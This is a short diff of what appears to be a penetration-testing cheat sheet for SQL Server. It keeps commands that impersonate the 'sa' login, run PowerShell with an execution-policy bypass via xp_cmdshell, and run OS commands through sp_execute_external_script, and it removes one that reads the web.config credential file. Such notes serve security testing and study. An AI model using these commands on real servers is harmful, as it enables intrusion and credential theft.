@@ -74,8 +74,4 @@ execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass cur
 EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
 ```
 
-```mysql
-EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("type \inetpub\wwwroot\web.config");';
-```
-
 <br>
